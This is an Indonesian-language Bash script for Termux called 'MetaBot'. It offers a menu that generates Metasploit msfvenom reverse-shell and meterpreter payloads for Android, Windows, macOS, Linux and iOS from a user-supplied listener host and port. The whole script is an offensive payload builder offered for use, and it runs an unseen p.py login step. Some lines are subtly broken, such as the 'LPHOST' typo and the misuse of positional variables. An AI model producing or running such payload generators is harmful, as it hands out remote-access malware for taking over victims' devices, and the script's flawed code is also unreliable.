#!/usr/bin/bash
#Copyright© 2019 By Fajar Firdaus
#Jangan Di Recode cuk
pkg install python2 -y
pkg install toilet -y
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo $green"[$]=====================[$]"
echo $blue"Author : Fajar Firdaus"
echo $blue"Fb : Fajar Firdaus"
echo $blue"IG : fajar_firdaus_7"
echo $blue"Github : FajarTheGGman"
echo $green"[$]=====================[$]"
sleep 1
echo $red"Note : Kalo Gak Tau id pw nya pm gw"
sleep 1
python2 p.py
sleep 1
echo $red"Note : Pastikan Metasploit Sudah Terinstall"
toilet -f future "[==MetaBot==]" --gay
echo $white"[===========Pilih jenis Exploit===========]"
echo $green"(1).Android"
echo $green"(2).Windows"
echo $green"(3).MacOs"
echo $green"(4).Linux"
echo $green"(5).IOS"
echo $red"(0).Keluar"
echo $white"[===========Pilih jenis Exploit===========]"
read -p "root@MetaBot-#" c

if [ $c = 1 ] || [ $c = 1 ]
then
read -p "Masukan LocalHost elu : " r
read -p "Masukan LocalPort elu : " f
read -p "Masukan Nama Payload Elu :" p
msfvenom -p android/meterpreter/reverse_tcp LHOST=$r LPORT=$f R> /storage/emulated/0/$p
sleep 1
echo $red"Payload Berhasil Dibuat ! Silahkan cek payload di memory internal"
fi

if [ $c = 2 ] || [ $c = 2 ]
then
read -p "Masukan LocalHost elu : " w
read -p "Masukan LocalPort elu : " d
read -p "Masukan Nama Payload elu : " x
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$w LPORT=$d R> /storage/emulated/0/$x
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $c = 3 ] || [ $c = 3 ]
then
read -p "Masukan LocalHost elu : " 3
read -p "Masukan LocalPort elu : " 2
read -p "Masukan Nama Payload elu : " 1
echo $purple"(1).armle"
echo $purole"(2).ppc"
echo $purple"(3).x64"
echo $purple"(4).x86"
read -p "Pilih jenis MacOs : " s

if [ $s = 1 ]
then
msfvenom -p osx/armle/shell_reverse_tcp LHOST=$3 LPORT=$2 R> /storage/emulated/0/$1
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $s = 2 ]
then
msfvenom -p osx/ppc/shell_reverse_tcp LHOST=$3 LPORT=$2 R> /storage/emulated/0/$1
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $s = 3 ]
then
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$3 LPORT=$2 R> /storage/emulated/0/$1
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $s = 4 ]
then
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$3 LPORT=$2 R> /storage/emulated/0/$1
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

fi

if [ $c = 4 ] || [ $c = 4 ]
then
read -p "Masukan LocalHost elu : " h
read -p "Masukan LocalPort elu : " a
read -p "Masukan Nama Payload elu : " y
echo $white"(1).> aarch64"
echo $white"(2).> x86"
echo $white"(3).> x64"
read -p "Pilih Jenis Linux : " n

if [ $n = 1 ]
then
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LPHOST=$h LPORT=$a R> /storage/emulated/0/$y
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $n = 2 ]
then
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$h LPORT=$a R> /storage/emulated/0/$y
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $n = 3 ]
then
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$h LPORT=$a R> /storage/emulated/0/$y
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

fi

if [ $c = 5 ] || [ $c = 5 ]
then
read -p "Masukan LocalHost elu : " r
read -p "Masukan LocalPort elu : " f
read -p "Masukan Nama Payload Elu : " p
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$r LPORT=$f R> /storage/emulated/0/$p
echo $red"Payload Berhasil Dibuat ! cek payload di memory internal"
fi

if [ $c = 0 ] || [ $c = 0 ]
then
echo $white"Terimakasih Telah Menggunakan tools ini :)"
sleep 1
echo $white"Copyright© 2019 by Fajar Firdaus"
sleep 1
echo $white"Jangan Di Recode yak soalnya cape buat nya :)"
exit
fi
